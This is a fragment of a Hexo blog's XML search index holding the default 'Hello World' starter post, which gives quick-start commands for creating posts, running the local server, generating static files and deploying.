    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
